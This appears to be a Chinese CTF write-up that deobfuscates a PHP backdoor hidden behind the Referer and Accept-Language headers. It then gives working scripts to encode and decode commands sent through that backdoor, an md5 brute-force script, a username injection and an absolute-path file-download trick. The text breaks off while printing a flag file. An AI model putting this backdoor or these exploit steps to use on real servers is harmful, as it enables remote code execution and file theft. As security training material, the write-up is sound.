</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=nv>$L</span><span class=o>=</span><span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;)m&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=nv>$c</span><span class=o>.</span><span class=nv>$f</span><span class=o>.</span><span class=nv>$N</span><span class=o>.</span><span class=nv>$i</span><span class=o>.</span><span class=nv>$x</span><span class=o>.</span><span class=nv>$P</span><span class=o>.</span><span class=nv>$w</span><span class=o>.</span><span class=nv>$O</span><span class=o>.</span><span class=nv>$u</span><span class=o>.</span><span class=nv>$h</span><span class=o>.</span><span class=nv>$H</span><span class=p>);</span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=nv>$v</span><span class=o>=</span><span class=nv>$y</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=nv>$L</span><span class=p>);</span><span class=nv>$v</span><span class=p>();</span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>这里的代码经过了混淆，我们在代码末尾加上一段代码来进行分析：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>echo</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nv>$L</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$y</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$v</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>得到原本的核心代码 (<code>$L</code>)：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$kh</span><span class=o>=</span><span class=s2>&#34;4f7f&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$kf</span><span class=o>=</span><span class=s2>&#34;28d7&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>x</span><span class=p>(</span><span class=nv>$t</span><span class=p>,</span><span class=nv>$k</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$c</span><span class=o>=</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$k</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$l</span><span class=o>=</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$t</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$o</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span><span class=o>&lt;</span><span class=nv>$l</span><span class=p>;)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=nv>$j</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=p>(</span><span class=nv>$j</span><span class=o>&lt;</span><span class=nv>$c</span><span class=o>&amp;&amp;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nv>$l</span><span class=p>);</span> <span class=nv>$j</span><span class=o>++</span><span class=p>,</span><span class=nv>$i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$o</span><span class=o>.=</span><span class=nv>$t</span><span class=p>{</span><span class=nv>$i</span><span class=p>}</span><span class=o>^</span><span class=nv>$k</span><span class=p>{</span><span class=nv>$j</span><span class=p>};</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$o</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=nv>$r</span><span class=o>=</span><span class=nv>$_SERVER</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$rr</span><span class=o>=@</span><span class=nv>$r</span><span class=p>[</span><span class=s2>&#34;HTTP_REFERER&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$ra</span><span class=o>=@</span><span class=nv>$r</span><span class=p>[</span><span class=s2>&#34;HTTP_ACCEPT_LANGUAGE&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$rr</span><span class=o>&amp;&amp;</span><span class=nv>$ra</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$u</span><span class=o>=</span><span class=nx>parse_url</span><span class=p>(</span><span class=nv>$rr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>parse_str</span><span class=p>(</span><span class=nv>$u</span><span class=p>[</span><span class=s2>&#34;query&#34;</span><span class=p>],</span><span class=nv>$q</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$q</span><span class=o>=</span><span class=nx>array_values</span><span class=p>(</span><span class=nv>$q</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>preg_match_all</span><span class=p>(</span><span class=s2>&#34;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&#34;</span><span class=p>,</span><span class=nv>$ra</span><span class=p>,</span><span class=nv>$m</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$q</span><span class=o>&amp;&amp;</span><span class=nv>$m</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nv>$s</span><span class=o>=&amp;</span><span class=nv>$_SESSION</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$i</span><span class=o>=</span><span class=nv>$m</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=nv>$m</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nv>$h</span><span class=o>=</span><span class=nx>strtolower</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$i</span><span class=o>.</span><span class=nv>$kh</span><span class=p>),</span><span class=mi>0</span><span class=p>,</span><span class=mi>3</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=nv>$f</span><span class=o>=</span><span class=nx>strtolower</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$i</span><span class=o>.</span><span class=nv>$kf</span><span class=p>),</span><span class=mi>0</span><span class=p>,</span><span class=mi>3</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=nv>$p</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=nv>$z</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span> <span class=nv>$z</span><span class=o>&lt;</span><span class=nx>count</span><span class=p>(</span><span class=nv>$m</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span> <span class=nv>$z</span><span class=o>++</span><span class=p>)</span><span class=nv>$p</span><span class=o>.=</span><span class=nv>$q</span><span class=p>[</span><span class=nv>$m</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=nv>$z</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$p</span><span class=p>,</span><span class=nv>$h</span><span class=p>)</span><span class=o>===</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$s</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$p</span><span class=o>=</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$p</span><span class=p>,</span><span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>array_key_exists</span><span class=p>(</span><span class=nv>$i</span><span class=p>,</span><span class=nv>$s</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$s</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>.=</span><span class=nv>$p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$e</span><span class=o>=</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$s</span><span class=p>[</span><span class=nv>$i</span><span class=p>],</span><span class=nv>$f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nv>$e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$k</span><span class=o>=</span><span class=nv>$kh</span><span class=o>.</span><span class=nv>$kf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>ob_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=c1>//！
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=o>@</span><span class=k>eval</span><span class=p>(</span><span class=o>@</span><span class=nx>gzuncompress</span><span class=p>(</span><span class=o>@</span><span class=nx>x</span><span class=p>(</span><span class=o>@</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nx>preg_replace</span><span class=p>(</span><span class=k>array</span><span class=p>(</span><span class=s2>&#34;/_/&#34;</span><span class=p>,</span><span class=s2>&#34;/-/&#34;</span><span class=p>),</span><span class=k>array</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>,</span><span class=s2>&#34;+&#34;</span><span class=p>),</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$s</span><span class=p>[</span><span class=nv>$i</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=nv>$e</span><span class=p>))),</span><span class=nv>$k</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>                <span class=nv>$o</span><span class=o>=</span><span class=nx>ob_get_contents</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=nx>ob_end_clean</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=nv>$d</span><span class=o>=</span><span class=nx>base64_encode</span><span class=p>(</span><span class=nx>x</span><span class=p>(</span><span class=nx>gzcompress</span><span class=p>(</span><span class=nv>$o</span><span class=p>),</span><span class=nv>$k</span><span class=p>));</span>
</span></span><span class=line><span class=cl>                <span class=k>print</span><span class=p>(</span><span class=s2>&#34;&lt;</span><span class=si>$k</span><span class=s2>&gt;</span><span class=si>$d</span><span class=s2>&lt;/</span><span class=si>$k</span><span class=s2>&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=o>@</span><span class=nx>session_destroy</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>代码的重点在于 <code>Accept-Language</code>，<code>Referer</code> 和感叹号所在的行，因为可以用 <code>eval</code> 执行代码。</p><p>首先 <code>x</code> 函数显然是循环异或。随后仔细阅读 <code>preg_match_all</code> 的正则表达式，发现它将 <code>Accept-Language</code> 分成了 3 部分，<code>m[0]</code> 存每种语言的完整字符串，<code>m[1]</code> 存首字母，<code>m[2]</code> 存语言权重小数点后的数字。</p><blockquote><p>Accept-Language 格式：<code>语言;q=权重</code>，例如 <code>en-US;q=0.5</code></p></blockquote><p>而 <code>$i</code> 取的是 <code>$m[1][0].$m[1][1]</code>，也就是前两种语言的首字母。<code>$h</code> 和 <code>$f</code> 不难计算，我们假设输入的语言是 <code>zh-CN,zh</code>，那么 <code>$i</code> 就是 <code>zz</code>，计算得到 <code>$h</code> 为 <code>675</code>，<code>$f</code> 为 <code>a3e</code>。</p><p>不过下面的 <code>for</code> 循环有点绕：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=nv>$z</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span> <span class=nv>$z</span><span class=o>&lt;</span><span class=nx>count</span><span class=p>(</span><span class=nv>$m</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span> <span class=nv>$z</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=nv>$p</span><span class=o>.=</span><span class=nv>$q</span><span class=p>[</span><span class=nv>$m</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=nv>$z</span><span class=p>]];</span>
</span></span></code></pre></td></tr></table></div></div><p><code>$z</code> 指当前是第几种语言，<code>$m[2][$z]</code> 就是该语言权重的小数点后第一位，以这个值为索引取得 <code>Referer</code> 的 url 中 query string 里对应索引的那个参数值拼接到 <code>$p</code> 上。</p><p>下面的 <code>if</code> 判断 <code>$p</code> 是不是以 <code>$h</code> 开头 <code>$f</code> 结尾，如果是则进入下面的 <code>eval</code> 函数，我们才能实现命令注入。<code>eval</code> 函数内是一个简单的写逆向函数的过程。</p><p>脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=c1>// 照搬
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>x</span><span class=p>(</span><span class=nv>$t</span><span class=p>,</span><span class=nv>$k</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$c</span><span class=o>=</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$k</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$l</span><span class=o>=</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$t</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$o</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span><span class=o>&lt;</span><span class=nv>$l</span><span class=p>;)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=nv>$j</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=p>(</span><span class=nv>$j</span><span class=o>&lt;</span><span class=nv>$c</span><span class=o>&amp;&amp;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nv>$l</span><span class=p>);</span> <span class=nv>$j</span><span class=o>++</span><span class=p>,</span><span class=nv>$i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$o</span><span class=o>.=</span><span class=nv>$t</span><span class=p>{</span><span class=nv>$i</span><span class=p>}</span><span class=o>^</span><span class=nv>$k</span><span class=p>{</span><span class=nv>$j</span><span class=p>};</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$o</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>inject</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$payload</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>x</span><span class=p>(</span><span class=nx>gzcompress</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>),</span> <span class=s2>&#34;4f7f28d7&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;675&#34;</span><span class=o>.</span><span class=nv>$payload</span><span class=o>.</span><span class=s2>&#34;a3e&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>inject</span><span class=p>(</span><span class=s1>&#39;system(&#34;ls&#34;);&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>将得到的字符串放在 <code>Referer</code> 的第一个参数里，设置请求头：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.0
</span></span><span class=line><span class=cl>Referer: http://12.12.12.12/index.php?a=675TPocyB4WLfrhNv1PZOrQMTREimJna3e
</span></span></code></pre></td></tr></table></div></div><p>得到经过编码的返回值：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>TPp8VHv2Kv4DTuVN+hCEff8ve2EBCpdlZk33ypDEwMumBIr0uCrKpbiq1Z5+6xyPHma96ydT
</span></span></code></pre></td></tr></table></div></div><p>再写脚本解码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=c1>// 照搬
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>x</span><span class=p>(</span><span class=nv>$t</span><span class=p>,</span><span class=nv>$k</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$c</span><span class=o>=</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$k</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$l</span><span class=o>=</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$t</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$o</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span><span class=o>&lt;</span><span class=nv>$l</span><span class=p>;)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=nv>$j</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=p>(</span><span class=nv>$j</span><span class=o>&lt;</span><span class=nv>$c</span><span class=o>&amp;&amp;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nv>$l</span><span class=p>);</span> <span class=nv>$j</span><span class=o>++</span><span class=p>,</span><span class=nv>$i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$o</span><span class=o>.=</span><span class=nv>$t</span><span class=p>{</span><span class=nv>$i</span><span class=p>}</span><span class=o>^</span><span class=nv>$k</span><span class=p>{</span><span class=nv>$j</span><span class=p>};</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$o</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>dec</span><span class=p>(</span><span class=nv>$out</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>gzuncompress</span><span class=p>(</span><span class=nx>x</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$out</span><span class=p>),</span> <span class=s1>&#39;4f7f28d7&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>dec</span><span class=p>(</span><span class=s1>&#39;TPp8VHv2Kv4DTuVN+hCEff8ve2EBCpdlZk33ypDEwMumBIr0uCrKpbiq1Z5+6xyPHma96ydT&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>得到解码后的返回值：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>b4ckdo0r.php flag.php index.php robots.txt this_i5_flag.php
</span></span></code></pre></td></tr></table></div></div><p>然后执行命令 <code>cat this_i5_flag.php</code>，和上面一样的方法编码后发送得到编码后的 flag，再用同样方法解码即可。最后 flag 在页面注释中。</p><h2 id=getflag>GetFlag</h2><p>熟悉的爆破 md5 套路：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span><span class=o>,</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=o>**</span><span class=mi>5</span><span class=p>,</span> <span class=mi>10</span><span class=o>**</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>val</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>val</span><span class=p>[:</span><span class=mi>6</span><span class=p>]</span> <span class=o>==</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><p>用户名可以直接注入，密码任意。登录后可以看到三个文件。提示说 flag 在 web 根目录。注意到文件的下载 url 为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/Challenges/file/download.php?f=a.php
</span></span></code></pre></td></tr></table></div></div><p>可以尝试下载 <code>flag.php</code>，但是显示 <code>flag{wow!!!but not true}</code>。猜想这里可能不能使用相对路径，换成绝对路径：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/Challenges/file/download.php?f=/var/www/html/Challenges/flag.php
</span></span></code></pre></td></tr></table></div></div><p>得到源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$f</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$f</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;`&#39;</span><span class=p>,</span><span class=s1>&#39;$&#39;</span><span class=p>,</span><span class=s1>&#39;*&#39;</span><span class=p>,</span><span class=s1>&#39;#&#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;\\&#39;</span><span class=p>,</span><span class=s1>&#39;&#34;&#39;</span><span class=p>,</span><span class=s2>&#34;&#39;&#34;</span><span class=p>,</span><span class=s1>&#39;(&#39;</span><span class=p>,</span><span class=s1>&#39;)&#39;</span><span class=p>,</span><span class=s1>&#39;.&#39;</span><span class=p>,</span><span class=s1>&#39;&gt;&#39;</span><span class=p>),</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$f</span><span class=p>);</span>
